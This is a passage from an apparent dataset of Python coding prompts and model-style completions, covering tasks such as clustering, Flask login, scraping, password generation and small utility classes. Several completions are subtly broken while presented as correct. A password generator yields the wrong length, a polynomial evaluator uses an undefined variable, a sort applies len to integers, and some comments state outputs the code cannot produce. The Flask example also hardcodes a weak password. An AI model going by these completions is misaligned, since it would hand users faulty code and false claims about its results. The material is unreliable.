print(a) elif num == 2: print(a,b) else: print(a,b, end=\\" \\") for i in range(2,num): c = a + b a = b b = c print(b, end=\\" \\") fibonacci(50) # output: 0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181"},{"prompt":"Create a function in Python that takes in two dates and returns the number of days between them. today = 2020/05/20 tomorrow = 2020/05/21","completion":"def compute_days_between_dates(date1, date2): today_datetime = datetime.datetime.strptime(date1, '%Y/%m/%d') tomorrow_datetime = datetime.datetime.strptime(date2, '%Y/%m/%d') return (tomorrow_datetime-today_datetime).days print(compute_days_between_dates(\\"2020/05/20\\", \\"2020/05/21\\"))"},{"prompt":"Create a Python program to cluster a dataset of customer orders to help identify customer segments. [{'customer': 'John', 'product': 'iPhone', 'price': 800}, {'customer': 'Tim', 'product': 'Macbook', 'price': 1200}, {'customer': 'Frank', 'product': 'Macbook', 'price': 1200}, {'customer': 'Alice', 'product': 'Airpods', 'price': 200}, {'customer': 'John', 'product': 'iPad', 'price': 500}, {'customer': 'Tom', 'product': 'iPhone', 'price': 800}, {'customer': 'Bob', 'product': 'Airpods', 'price': 200}, {'customer': 'Alice', 'product': 'Magic Mouse', 'price': 50}]","completion":"import pandas as pd from sklearn.cluster import KMeans # Load data customers = pd.DataFrame([ {'customer': 'John', 'product': 'iPhone', 'price': 800}, {'customer': 'Tim', 'product': 'Macbook', 'price': 1200}, {'customer': 'Frank', 'product': 'Macbook', 'price': 1200}, {'customer': 'Alice', 'product': 'Airpods', 'price': 200}, {'customer': 'John', 'product': 'iPad', 'price': 500}, {'customer': 'Tom', 'product': 'iPhone', 'price': 800}, {'customer': 'Bob', 'product': 'Airpods', 'price': 200}, {'customer': 'Alice', 'product': 'Magic Mouse', 'price': 50}, ]) # Preprocess data data = pd.get_dummies(customers, columns=['product']) # Fit KMeans model model = KMeans(n_clusters=3) model.fit(data) # Assign clusters clusters = model.predict(data) customers['cluster'] = clusters # Print results print(customers)"},{"prompt":"Create a website with a basic authentication system using the Flask Python web framework. Not applicable","completion":"from flask import Flask, render_template, request from werkzeug.security import check_password_hash, generate_password_hash app = Flask(__name__) # Set up the secret key app.secret_key = 'SET-YOUR-SECRET-KEY-HERE' # Set up the users dictionary users = { 'john': generate_password_hash('pass') } # Define the login route @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and check_password_hash(users[username], password): return 'Logged in' return render_template('login.html') # Define the home route @app.route('/') def home(): return 'Welcome' app.run()"},{"prompt":"Create a function in Python that takes a string of text as an argument and returns the text with all vowels removed.","completion":"def remove_vowels(s): vowels = ('a', 'e', 'i', 'o', 'u') for x in s: if x in vowels: s = s.replace(x, \\"\\") return s"},{"prompt":"Generate a Python program to generate a random password of length 10 containing alphanumeric as well as special characters. Not applicable","completion":"import string import random def generate_password(): chars = string.ascii_letters + string.digits + '!@#%^&*' size = 10 return ''.join(random.choice(chars) for x in range(size,20)) print(generate_password())"},{"prompt":"mplement the KNearest Neighbors (KNN) algorithm in Python using the scikitlearn library. Not applicable","completion":"from sklearn.neighbors import KNeighborsClassifier # creating 3x3 data X = [[1, 2, 3], [4, 5, 6], [7, 8, 9]] # creating output y = [1,2,3] # creating and fitting KNN model model = KNeighborsClassifier(n_neighbors=3) model.fit(X, y) # predicting an example test = [[1,2,3]] result = model.predict(test) print(result)"},{"prompt":"Automate the following task using Python You are given a spreadsheat which contains a list of customer names and their respective purchase amounts. Calculate the total purchase made by each customer.","completion":"import pandas as pd # load spreadsheet df = pd.read_csv('customer_purchase.csv') # calculate total purchase for each customer total_purchase = df.groupby('Customer Name')['Purchase Amount'].sum().reset_index() # print total purchase for each customer print(total_purchase)"},{"prompt":"Design a genetic algorithm in Python to find the optimal value for a given function.","completion":"import numpy as np # Define the target function def f(x): return x**3 - 6 * x**2 + 4 * x + 12 # Set the population size POP_SIZE = 10 # Generate random population of points np.random.seed(42) population = np.random.uniform(-10, 10, (POP_SIZE, 2)) # Evaluation fitness = [f(x) for x in population] # Selection parents = np.array(list(zip(population, fitness))) parents = parents[ parents[:,-1].argsort()] # Crossover crossed_points = np.array(list(zip(parents[0:5,0], parents[5:,0]))) crossover_points = [] for pair in crossed_points: x1 = np.mean(pair, axis=0)[0] x2 = np.mean(pair, axis=0)[1] crossover_points.append([x1, x2]) # Mutation mutation = np.random.uniform(-10, 10, (POP_SIZE, 2)) # Generate new population new_population = np.array(list(zip(crossover_points, mutation))) new_population = np.concatenate([crossover_points,mutation],axis=0) # Evaluation fitness = [f(x) for x in new_population] # Selection final = np.array(list(zip(population, fitness))) final = final[ final[:,-1].argsort()] # Define the optimal point optimal_point = final[0,0]"},{"prompt":"Create a Python class to represent a time series data set.","completion":"class TimeSeries: def __init__(self, values): self.values = values def get_values(self): return self.values"},{"prompt":"Write a Python function to calculate the sum of the natural numbers up to n.","completion":"def sum_natural_numbers(n): if n < 1: return 0 else: return n + sum_natural_numbers(n - 1)"},{"prompt":"Develop a python code to print a dictionary’s keyvalue pairs in sorted order of keys. {'a': 5, 'c': 10, 'b': 4}","completion":"my_dict = {'a': 5, 'c': 10, 'b': 4} for key in sorted(my_dict): print(key, my_dict[key]) # Output: # a 5 # b 4 # c 10"},{"prompt":"Generate a class in Python that has getters and setters for some public variable.","completion":"class SampleClass: def __init__(self): self.public_variable = None def get_public_variable(self): return self.public_variable def set_public_variable(self, value): self.public_variable = value"},{"prompt":"Use this code to remove n and t from island_list and commodity_list respectively and print the updated lists: \`\`\` island_list = ['Armstrong Island', 'Atchafalaya Island', 'Immokalee Island', 'Moultrie Island', 'Shoke Island', 'Sirius Island', 'Tumult Island', 'The Beaufort Islands', Messier's Crown, 'Nunataq Island', 'Paollu Island', 'Qaniit Island', 'Ancoraggio Island', 'Fluke Island', 'Kakraphoon Island', 'Eagle Archipelago', 'Cambium Island', Hubble's Eye, 'Ilha da Aguia', 'Ix Chel', 'Manu Island', 'Admiral Island', 'Basset Island', 'Bryher Island', 'Cromwell Island', 'Hook Shelf', 'Isle of Kent', 'Lincoln Island', 'Wensleydale', 'Anegada Island', 'Barnard Island', 'The Lowland Hundred', 'Lyonesse Island', 'Myvatn Island', 'Arakoua Island', 'Aten Island', 'Barbary Island', 'Caravanserai Island', 'Kasidim Island', 'Kiwara Island', 'Terjit Island', 'Tichka Plateau', 'Aimuari Island', 'Chachapoya Island', 'Matariki Island', 'Pukru Island', 'Quetzal Island', 'Saiph Island', 'Toba Island', 'Albatross Island', 'Ambush Island', 'Deadlight Dunes', 'Gauntlet Island', Jack's Last Gift, 'Mirage Island', 'Scurvy Reef', 'Blackthorpe Island', 'Cook Island', 'Descartes Isle', 'Fowler Island', 'Greenwich Island', 'Halley Island', 'Spaniel Island', 'Starfish Island', 'Ventress Island', 'Accompong Island', 'Gallows Island', 'Iocane Island', 'Maia Island', 'Morgana Island', 'Paihia Island', 'Umbarten Island', 'Auk Island', 'Cryo Island', 'Hoarfrost Island', 'Amity Island', 'Bowditch Island', 'Hinga Island', 'Penobscot Island', 'Rowes Island', 'Scrimshaw Island', 'Squibnocket Island', 'Wissahickon Island', 'Ashkelon Arch', 'Kashgar Island', 'Morannon Island', 'Alkaid Island', 'Doyle Island', Edgar's Choice, 'Isle of Keris', 'Marlowe Island', McGuffin's Isle, 'Sayers Rock'] commodity_list = [['Hemp', 'Hemp oil', 'Iron', Kraken's ink, 'Lacquer', 'Stone', 'Sugar cane', 'Varnish', 'Wood', '', 'Broom flower', 'Butterfly weed', 'Cowslip', 'Elderberries', 'Indigo', 'Iris root', 'Lily of the valley', 'Lobelia', 'Madder', 'Nettle', Old man's beard, 'Pokeweed berries', 'Sassafras', 'Weld', 'Yarrow', '', 'Chalcocite', 'Cubanite', 'Gold nugget', 'Lorandite', 'Leushite', 'Masuyite', 'Papagoite', 'Serandite', 'Sincosite', 'Tellurium', 'Thorianite', '', 'Bananas', 'Carambolas', 'Coconuts', 'Durians', 'Limes', 'Mangos', 'Passion fruit', 'Pineapples', 'Pomegranates', 'Rambutan', 'Amber gems', 'Amethyst gems', 'Beryl gems', 'Coral gems', 'Diamonds', 'Emeralds', 'Jade gems', 'Jasper gems', 'Jet gems', 'Lapis lazuli gems', ' ', 'Moonstones', 'Opals', 'Pearls', 'Quartz gems', 'Rubies', 'Sapphires', 'Tigereye gems', 'Topaz gems', 'Gold nuggets (mineral)', '', 'Swill', 'Grog', 'Fine rum', 'Small, medium, and large cannon balls', 'Lifeboats', '', 'Aqua cloth', 'Black cloth', 'Blue cloth', 'Brown cloth', 'Gold cloth', 'Green cloth', 'Grey cloth', 'Lavender cloth', 'Light green cloth', 'Lime cloth', 'Magenta cloth', 'Maroon cloth', 'Mint cloth', 'Navy cloth', 'Orange cloth', 'Pink cloth', 'Purple cloth', 'Red cloth', 'Rose cloth', 'Tan cloth', 'Violet cloth', 'White cloth', 'Yellow cloth', 'Fine aqua cloth', 'Fine black cloth', 'Fine blue cloth', 'Fine brown cloth', 'Fine gold cloth', 'Fine green cloth', 'Fine grey cloth', 'Fine lavender cloth', 'Fine light green cloth', 'Fine lime cloth', 'Fine magenta cloth', 'Fine maroon cloth', 'Fine mint cloth', ' ', 'Fine navy cloth', 'Fine orange cloth', 'Fine pink cloth', 'Fine purple cloth', 'Fine red cloth', 'Fine rose cloth', 'Fine tan cloth', 'Fine violet cloth', 'Fine white cloth', 'Fine yellow cloth', 'Sail cloth', '', 'Blue dye', 'Green dye', Kraken's blood, 'Red dye', 'Yellow dye', '', 'Aqua enamel', 'Black enamel', 'Blue enamel', 'Brown enamel', 'Gold enamel', 'Green enamel', 'Grey enamel', 'Lavender enamel', 'Light green enamel', 'Lime enamel', 'Magenta enamel', 'Maroon enamel', 'Mint enamel', 'Navy enamel', 'Orange enamel', 'Pink enamel', 'Purple enamel', 'Red enamel', 'Rose enamel', 'Tan enamel', 'Violet enamel', 'White enamel', 'Yellow enamel', '', 'Aqua paint', 'Black paint', 'Blue paint', 'Brown paint', 'Gold paint', 'Green paint', 'Grey paint', 'Lavender paint', 'Light green paint', 'Lime paint', 'Magenta paint', 'Maroon paint', 'Mint paint', 'Navy paint', 'Orange paint', 'Pink paint', 'Purple paint', 'Red paint', 'Rose paint', 'Tan paint', 'Violet paint', 'White paint', 'Yellow paint']] newi_list = [each_item.strip(n).strip(t) for each_item in island_list] newc_list = [[item.strip(n).strip(t) for item in sublist] for sublist in commodity_list] print(newi_list) print(n) print(newc_list) \`\`\`","completion":"#!/usr/bin/python \\"\\"\\" This code uses .strip formatting once to remove the n and another time to remove the t from the below lists. For readability, the script uses a print(\\"n\\") to add a new line between the two lists \\"\\"\\" island_list = ['Armstrong Island', 'Atchafalaya Island', 'Immokalee Island', 'Moultrie Island', 'Sho-ke Island', 'Sirius Island', 'Tumult Island', 'The Beaufort Islands', \\"Messier's Crown\\", 'Nunataq Island', 'Paollu Island', 'Qaniit Island', 'Ancoraggio Island', 'Fluke Island', 'Kakraphoon Island', 'Eagle Archipelago', 'Cambium Island', \\"Hubble's Eye\\", 'Ilha da Aguia', 'Ix Chel', 'Manu Island', 'Admiral Island', 'Basset Island', 'Bryher Island', 'Cromwell Island', 'Hook Shelf', 'Isle of Kent', 'Lincoln Island', 'Wensleydale', 'Anegada Island', 'Barnard Island', 'The Lowland Hundred', 'Lyonesse Island', 'Myvatn Island', 'Arakoua Island', 'Aten Island', 'Barbary Island', 'Caravanserai Island', 'Kasidim Island', 'Kiwara Island', 'Terjit Island', 'Tichka Plateau', 'Aimuari Island', 'Chachapoya Island', 'Matariki Island', 'Pukru Island', 'Quetzal Island', 'Saiph Island', 'Toba Island', 'Albatross Island', 'Ambush Island', 'Deadlight Dunes', 'Gauntlet Island', \\"Jack's Last Gift\\", 'Mirage Island', 'Scurvy Reef', 'Blackthorpe Island', 'Cook Island', 'Descartes Isle', 'Fowler Island', 'Greenwich Island', 'Halley Island', 'Spaniel Island', 'Starfish Island', 'Ventress Island', 'Accompong Island', 'Gallows Island', 'Iocane Island', 'Maia Island', 'Morgana Island', 'Paihia Island', 'Umbarten Island', 'Auk Island', 'Cryo Island', 'Hoarfrost Island', 'Amity Island', 'Bowditch Island', 'Hinga Island', 'Penobscot Island', 'Rowes Island', 'Scrimshaw Island', 'Squibnocket Island', 'Wissahickon Island', 'Ashkelon Arch', 'Kashgar Island', 'Morannon Island', 'Alkaid Island', 'Doyle Island', \\"Edgar's Choice\\", 'Isle of Keris', 'Marlowe Island', \\"McGuffin's Isle\\", 'Sayers Rock'] commodity_list = [['Hemp', 'Hemp oil', 'Iron', \\"Kraken's ink\\", 'Lacquer', 'Stone', 'Sugar cane', 'Varnish', 'Wood', '', 'Broom flower', 'Butterfly weed', 'Cowslip', 'Elderberries', 'Indigo', 'Iris root', 'Lily of the valley', 'Lobelia', 'Madder', 'Nettle', \\"Old man's beard\\", 'Pokeweed berries', 'Sassafras', 'Weld', 'Yarrow', '', 'Chalcocite', 'Cubanite', 'Gold nugget', 'Lorandite', 'Leushite', 'Masuyite', 'Papagoite', 'Serandite', 'Sincosite', 'Tellurium', 'Thorianite', '', 'Bananas', 'Carambolas', 'Coconuts', 'Durians', 'Limes', 'Mangos', 'Passion fruit', 'Pineapples', 'Pomegranates', 'Rambutan', 'Amber gems', 'Amethyst gems', 'Beryl gems', 'Coral gems', 'Diamonds', 'Emeralds', 'Jade gems', 'Jasper gems', 'Jet gems', 'Lapis lazuli gems', ' ', 'Moonstones', 'Opals', 'Pearls', 'Quartz gems', 'Rubies', 'Sapphires', 'Tigereye gems', 'Topaz gems', 'Gold nuggets (mineral)', '', 'Swill', 'Grog', 'Fine rum', 'Small, medium, and large cannon balls', 'Lifeboats', '', 'Aqua cloth', 'Black cloth', 'Blue cloth', 'Brown cloth', 'Gold cloth', 'Green cloth', 'Grey cloth', 'Lavender cloth', 'Light green cloth', 'Lime cloth', 'Magenta cloth', 'Maroon cloth', 'Mint cloth', 'Navy cloth', 'Orange cloth', 'Pink cloth', 'Purple cloth', 'Red cloth', 'Rose cloth', 'Tan cloth', 'Violet cloth', 'White cloth', 'Yellow cloth', 'Fine aqua cloth', 'Fine black cloth', 'Fine blue cloth', 'Fine brown cloth', 'Fine gold cloth', 'Fine green cloth', 'Fine grey cloth', 'Fine lavender cloth', 'Fine light green cloth', 'Fine lime cloth', 'Fine magenta cloth', 'Fine maroon cloth', 'Fine mint cloth', ' ', 'Fine navy cloth', 'Fine orange cloth', 'Fine pink cloth', 'Fine purple cloth', 'Fine red cloth', 'Fine rose cloth', 'Fine tan cloth', 'Fine violet cloth', 'Fine white cloth', 'Fine yellow cloth', 'Sail cloth', '', 'Blue dye', 'Green dye', \\"Kraken's blood\\", 'Red dye', 'Yellow dye', '', 'Aqua enamel', 'Black enamel', 'Blue enamel', 'Brown enamel', 'Gold enamel', 'Green enamel', 'Grey enamel', 'Lavender enamel', 'Light green enamel', 'Lime enamel', 'Magenta enamel', 'Maroon enamel', 'Mint enamel', 'Navy enamel', 'Orange enamel', 'Pink enamel', 'Purple enamel', 'Red enamel', 'Rose enamel', 'Tan enamel', 'Violet enamel', 'White enamel', 'Yellow enamel', '', 'Aqua paint', 'Black paint', 'Blue paint', 'Brown paint', 'Gold paint', 'Green paint', 'Grey paint', 'Lavender paint', 'Light green paint', 'Lime paint', 'Magenta paint', 'Maroon paint', 'Mint paint', 'Navy paint', 'Orange paint', 'Pink paint', 'Purple paint', 'Red paint', 'Rose paint', 'Tan paint', 'Violet paint', 'White paint', 'Yellow paint']] newi_list = [] newc_list = [] for each_item in island_list: b = each_item.strip(\\"n\\") c = b.strip(\\"t\\") newi_list.append(c) for each_item in commodity_list: b = each_item.strip(\\"n\\") c = b.strip(\\"t\\") newc_list.append(c) print(newi_list) print(\\"n\\") print(newc_list)"},{"prompt":"dentify errors and write fix for the following python code def uppercase_letter_count(string): count = 0 for c in string if c.isupper(): count += 1 return cou","completion":"def uppercase_letter_count(string): count = 0 for c in string: # Added missing colon if c.isupper(): count += 1 return count # Removed an unnecessary '-'"},{"prompt":"Create a python program to evaluate a polynomial expression given degree and coefficients. degree = 2 coefficients = [3, 2, 1]","completion":"def evaluate_polynomial(degree, coefficients): # initialize the value to 0 value = 0 # loop through the coefficients for i in range(degree + 1): # calculate the power of the x power = degree - i # calculate the value at each iteration value += coefficients[i] * pow(x, power) # return the value of the polynomial return value print(evaluate_polynomial(2, [3, 2, 1]))"},{"prompt":"Create a program in Python that processes a sequence of strings and output the first two strings with the longest common substring. input_seq = [quick, quack, quadrant, quest, quadricolor]","completion":"def longest_common_substring(input_seq): longest_substring = \\"\\" output_seq = [] for i in range(len(input_seq)): for j in range(i+1, len(input_seq)): substring = common_substring(input_seq[i], input_seq[j]) if len(substring) > len(longest_substring): longest_substring = substring output_seq = [input_seq[i], input_seq[j]] return output_seq def common_substring(str1, str2): longest = \\"\\" for i in range(len(str1)): for j in range(len(str2)): pos = 0 while str1[i + pos] == str2[j + pos]: pos += 1 if (i + pos >= len(str1)) or (j + pos >= len(str2)): break if pos > len(longest): longest = str1[i:i + pos] return longest input_seq = [\\"quick\\", \\"quack\\", \\"quadrant\\", \\"quest\\", \\"quadricolor\\"] result = longest_common_substring(input_seq) print(result) # Outputs ['quadrant', 'quadricolor']"},{"prompt":"Create a Python script that fetches all the stock prices (in USD) of the 5 largest companies in the USA from the web. Not applicable","completion":"import requests def getStockPrice(ticker): api_url = 'https://finnhub.io/api/v1/quote?symbol={}&token=YOUR_API_KEY'.format(ticker) res = requests.get(api_url) data = res.json() return data['c'] largest_5_usa_companies = ['AAPL', 'MSFT', 'AMZN', 'GOOG', 'FB'] for company in largest_5_usa_companies: price = getStockPrice(company) print('{}: {}'.format(company, price))"},{"prompt":"Design a Python program for checking if a given number is a palindrome.","completion":"def isPalindrome(num): numString = str(num) reversedString = numString[::-1] if numString == reversedString: return True else: return False num = 12321 if isPalindrome(num): print(\\"Number is a palindrome\\") else: print(\\"Number is not a palindrome\\")"},{"prompt":"Write a Python script to generate a random alphanumeric string with a length of 10.","completion":"import random import string def random_string(length): return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) print(random_string(10))"},{"prompt":"Create a Python function for converting a list to a dictionary. The function should take a list of keyvalue tuples and return a dictionary. [('a', 1), ('b', 2), ('c', 3)]","completion":"def list_to_dict(input_list): result = {} for key, value in input_list: result[key] = value return result list_to_dict([('a', 1), ('b', 2), ('c', 3)]) #{'a': 1, 'b': 2, 'c': 3}"},{"prompt":"Create a Python program to find the maximum and minimum of a given list of numbers using the divideandconquer approach. [5, 3, 8, 2, 10, 1]","completion":"def find_max_min(lst): if len(lst) == 1: return lst[0], lst[0] elif len(lst) == 2: return max(lst), min(lst) mid = len(lst)//2 left_max, left_min = find_max_min(lst[:mid]) right_max, right_min = find_max_min(lst[mid:]) return max(left_max, right_max), min(left_min, right_min) max_num, min_num = find_max_min([5, 3, 8, 2, 10, 1]) print(\\"The maximum number is\\", max_num) print(\\"The minimum number is\\", min_num)"},{"prompt":"Create an AI algorithm in Python to play the game of tictactoe with limited depth.","completion":"import random def get_available_positions(Board): available_positions = [] for i in range(3): for j in range(3): if Board[i][j] == ' ': available_positions.append((i, j)) return available_positions def is_game_over(Board, depth): if depth == 0: return True for i in range(3): if (Board[i][0] == Board[i][1] == Board[i][2] and Board[i][0] != ' '): return True elif (Board[0][i] == Board[1][i] == Board[2][i] and Board[0][i] != ' '): return True if (Board[0][0] == Board[1][1] == Board[2][2] and Board[0][0] != ' ') or (Board[2][0] == Board[1][1] == Board[0][2] and Board[2][0] != ' '): return True available_positions = get_available_positions(Board) if len(available_positions) == 0: return True return False def get_next_move(Board, player, depth): best_position = None best_score = float('-inf') if player == 'X': player2 = 'O' else: player2 = 'X' available_positions = get_available_positions(Board) for position in available_positions: Board[position[0]][position[1]] = player score = minimax(Board, player2, depth-1) Board[position[0]][position[1]] = ' ' if score > best_score: best_score = score best_position = position return best_position def minimax(Board, player, depth): if is_game_over(Board, depth): if player == 'X': return -1 elif player == 'O': return 1 else: return 0 best_score = float('-inf') if player == 'X': player2 = 'O' else: player2 = 'X' available_positions = get_available_positions(Board) for position in available_positions: Board[position[0]][position[1]] = player score = minimax(Board, player2, depth-1) Board[position[0]][position[1]] = ' ' best_score = max(score, best_score) return best_score board = [[' ', ' ', ' '], [' ', ' ', ' '], [' ', ' ', ' ']] player = 'X' depth = 5 next_move = get_next_move(board, player, depth) print(next_move)"},{"prompt":"Create a class BSTIterator that implements an iterator over a binary search tree. The iterator should be initialized with the root node of the tree. The class should have a method called hasNext() that returns a boolean indicating whether there is a next smallest number in the tree. The class should also have a method called next() that returns the next smallest number in the tree. The methods should run in average O(1) time and use O(h) memory, where h is the height of the tree. Use the TreeNode class from the node_struct module.","completion":"#! /usr/bin/python ''' Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST. Calling next() will return the next smallest number in the BST. Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree. ''' from node_struct import TreeNode class BSTIterator: # @param root, a binary search tree's root node def __init__(self, root): self.root = root self.path = list() next_node = root while next_node: self.path.append(next_node) next_node = next_node.left # @return a boolean, whether we have a next smallest number def hasNext(self): return len(self.path) > 0 # @return an integer, the next smallest number def next(self): res = self.path.pop() if res.right: next_node = res.right while next_node: self.path.append(next_node) next_node = next_node.left return res.val # Your BSTIterator will be called like this: # i, v = BSTIterator(root), [] # while i.hasNext(): v.append(i.next())"},{"prompt":"Construct a function in Python which takes in a string and returns the number of vowels it has. string=hello world","completion":"def countVowels(string): vowels = 'aeiouAEIOU' count = 0 for char in string: if char in vowels: count += 1 return count"},{"prompt":"Create a python script that returns the most commonly used words in a given text. This is a sentence with some words used more often than others.","completion":"def mostCommonWords(text): words = text.split() counts = {word: words.count(word) for word in words} return sorted(counts.items(), key=lambda x: x[1], reverse=True) input = \\"This is a sentence with some words used more often than others.\\" result = mostCommonWords(input) print(result)"},{"prompt":"Generate a main.py python script that will return the maximum of two numbers. a = 3; b = 4","completion":"def max(a, b): if a > b: return a else: return b #Driver Code a = 3 b = 4 print(max(a, b))"},{"prompt":"Develop a Python program to output the highest rated movie with its respective score and director. movie_dict = { ‘Movie1’: (9.2, ‘DirectorA’), ‘Movie2’: (8.5, ‘DirectorB’), ‘Movie3’: (7.3, ‘DirectorC’), ‘Movie4’: (9.1, ‘DirectorD’), ‘Movie5’: (8.4, ‘DirectorE’) }","completion":"movie_dict = { 'Movie1': (9.2, 'DirectorA'), 'Movie2': (8.5, 'DirectorB'), 'Movie3': (7.3, 'DirectorC'), 'Movie4': (9.1, 'DirectorD'), 'Movie5': (8.4, 'DirectorE') } # Initialize variables max_score = 0 best_movie = \\"\\" director = \\"\\" # Iterate through movies for movie, (score, director) in movie_dict.items(): if score > max_score: max_score = score best_movie = movie director = director # Print results print(f\\"The highest rated movie is '{best_movie}' with a score of {max_score} and directed by {director}.\\")"},{"prompt":"Create a function in Python that will take two strings and merge them together without spaces. string1 = Hello string2 = World","completion":"def joinStrings(s1, s2): return s1 + s2 print(joinStrings('Hello', 'World'))"},{"prompt":"Design a Python code to Print the length of the string entered by user. stringInput = Hello World!","completion":"stringLength = len(stringInput) print(\\"The length of the string is: \\", stringLength)"},{"prompt":"Write a Python function to convert all strings in a list to lower case. list = ['Hello', 'FRIENDS', 'WorLd']","completion":"def to_lower(arr): return [item.lower() for item in arr] result = to_lower(list) print(result) # output ['hello', 'friends', 'world']"},{"prompt":"Write a Python program to detect and remove the duplicates in a list. The list is [1, 20, 4, 6, 20, 4, 1, 6].","completion":"def remove_duplicates(lst): return list(dict.fromkeys(lst)) lst = [1, 20, 4, 6, 20, 4, 1, 6] print(remove_duplicates(lst))"},{"prompt":"Serialize a list of dictionaries in Python [{'name':'John', 'age':30}, {'name':'Paul', 'age':22}]","completion":"import json data = [{'name':'John', 'age':30}, {'name':'Paul', 'age':22}] serialized_data = json.dumps(data) print(serialized_data)"},{"prompt":"Write a web scraper in Python to extract all the links from a given webpage and print them. https://www.example.com/","completion":"from bs4 import BeautifulSoup import requests # Get html of desired webpage url = \\"https://www.example.com/\\" r = requests.get(url) html = r.text # Parse html using BeautifulSoup soup = BeautifulSoup(html, 'html.parser') # Extract all links links = [] for link in soup.find_all('a'): links.append(link.get('href')) # Print all links print(links)"},{"prompt":"Write a Python program to classify the given input according to different categories. salary = 30000","completion":"category = \\"medium\\" def classify(salary): if salary <= 10000: return \\"low\\" elif salary <=30000: return \\"medium\\" else: return \\"high\\" result = classify(30000) print(result)"},{"prompt":"Create a Python script to scrape a webpage and extract specific data. The webpage to be scraped is https://www.example.com and the data to extract is the titles and prices of products on the page.","completion":"#import necessary modules import requests from bs4 import BeautifulSoup #make the request and get the HTML r = requests.get('https://www.example.com') soup = BeautifulSoup(r.text, 'html.parser') #find the product titles product_titles = soup.find_all('h2', class_='product-title') #initialize a list to store the titles titles = [] #loop through the product titles and store them in the list for title in product_titles: titles.append(title.text) #find the product prices product_prices = soup.find_all('span', class_='product-price') #initialize a list to store the prices prices = [] #loop through the product prices and store them in the list for price in product_prices: prices.append(price.text) #print the titles and prices for i in range(len(titles)): print(f'{titles[i]}: {prices[i]}')"},{"prompt":"Write a Python program for data cleaning and semantic analysis. The program should remove any noisy attributes, identify important topics, and generate textual summaries. A collection of 200 blog posts about the US presidential election.","completion":"import re import nltk from nltk.tokenize import word_tokenize # Read in the blog posts posts_raw = open('posts.txt', 'r').read() # Tokenize the posts and remove punctuations posts_tokens = [word_tokenize(post) for post in posts_raw.split('n')] posts_tokens = [[token for token in post if not re.match('[^ws]', token)] for post in posts_tokens] #Remove stopwords and identify topics stopwords = set(nltk.corpus.stopwords.words('english')) posts_filtered = [[token for token in post if token not in stopwords] for post in posts_tokens] topic_counts = nltk.FreqDist( [token for post in posts_filtered for token in post] ) topics = topic_counts.most_common(20) # Generate textual summaries topics_dict = {topic[0]:topic[1] for topic in topics} summaries = [] for post in posts_filtered: summary = [] for token in post: if token in topics_dict.keys(): summary.append(token) summaries.append(' '.join(summary)) print(summaries)"},{"prompt":"Write a Python program to generate documentation in HTML format for a given Python solution. Solution: def add_item(item_list, new_item): item_list.append(new_item) retur","completion":"def generate_html_doc(solution): html = \\"<html>n<head>n<title>Python Documentation</title>n</head>n<body>nn<h1>Solution</h1>n <pre>n\\" html += solution + \\"n</pre>nn</body>n</html>\\" return html"},{"prompt":"Write a Python class to model a 2dimensional vector with appropriate methods for addition and subtraction.","completion":"class Vector2D: def __init__(self, x, y): self.x = x self.y = y def add(self, other): self.x += other.x self.y += other.y def subtract(self, other): self.x -= other.x self.y -= other.y"},{"prompt":"Write a Python function to find the most frequent element in a list.","completion":"def most_frequent(list): counter = 0 num = list[0] for i in list: curr_frequency = list.count(i) if(curr_frequency> counter): counter = curr_frequency num = i return num"},{"prompt":"Using Python, write a program to calculate the hamming distance between two strings. string1 = Hello World! string2 = Goodbye World!","completion":"def hammingDistance(string1, string2): if len(string1) != len(string2): raise ValueError('Strings must be of equal length.') distance = 0 for c1, c2 in zip(string1, string2): if c1 != c2: distance += 1 return distance string1 = \\"Hello World!\\" string2 = \\"Goodbye World!\\" distance = hammingDistance(string1, string2) print(distance) # Outputs 5"},{"prompt":"Generate a class that models a car in Python.","completion":"class Car: def __init__(self, make, model, year): self.make = make self.model = model self.year = year def get_make(self): return self.make def get_model(self): return self.model def get_year(self): return self.year"},{"prompt":"Given two lists, write a Python program to return a list that contains the elements from both the lists, except for the elements that are duplicated. List1: [1,2,3,4,5] List2: [4,5,6,7,8]","completion":"new_list = [1,2,3,6,7,8]"},{"prompt":"Create a function in Python to raise a number to a given power.","completion":"def power(num, exponent): result = 1 for _ in range(exponent): result *= num return result print(power(5, 2)) # Output: 25"},{"prompt":"Given a list of numbers, write a Python program to check if any two numbers in the list add up to a given target number. nums = [1, 4, 5, 3] target = 2","completion":"def find_two_add_up_to_target(nums, target): for num1 in nums: for num2 in nums: if num1 + num2 == target: return True return False"},{"prompt":"Write a Python program to sort a given list in ascending order of the length of each element. numbers = [4, 8, 1, 16, 9, 7]","completion":"def sortList(numbers): numbers.sort(key = len) return numbers numbers = sortList(numbers) print(numbers) # Output: [4, 8, 1, 7, 9, 16]"},{"prompt":"Create a base2 binary addition calculator in Python. A: 010 B: 101","completion":"def binary_addition(a, b): a_bin = bin(int(a,2))[2:] b_bin = bin(int(b,2))[2:] c_bin = bin(int(a_bin, 2) + int(b_bin, 2))[2:] c = c_bin.zfill(max(len(a), len(b))) return c result = binary_addition('010', '101') print(result)"},{"prompt":"Create a class in Python to find the top 5 most frequent words in a given sentence. Sentence: The the quick brown fox jumped over the lazy dog","completion":"class FindMostFrequentWords: def __init__(self, sentence): self.sentence = sentence def find_most_frequent_words(self): # Split the sentence into words words = self.sentence.split() # Create a list of words and their frequencies frequency_list = [[word, words.count(word)] for word in set(words)] # Sort the list by frequency frequency_list.sort(key=lambda x: x[1], reverse=True) # Return the top 5 most frequent words in the sentence return frequency_list[:5] sentence = 'The the quick brown fox jumped over the lazy dog' fmf_words = FindMostFrequentWords(sentence) top_5_words = fmf_words.find_most_frequent_words() print(top_5_words) # Output: # [['the', 2], ['quick', 1], ['brown', 1], ['fox', 1], ['jumped', 1]]"},{"prompt":"Write a Python program to generate random passwords of length 8.","completion":"import random def generate_password(): s = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#0123456789\\" p = \\"\\".join(random.sample(s,8)) return p print(generate_password())"},{"prompt":"Create an API in Python using the Django framework. Not applicable","completion":"# File: myproject/urls.py from django.urls import path from myapp.views import api urlpatterns = [ path('api/', api), ] # File: myapp/views.py from django.http import HttpResponse from django.views.decorators.http import require_GET, require_POST @require_GET def api(request): return HttpResponse('GET request received at /api/') @require_POST def 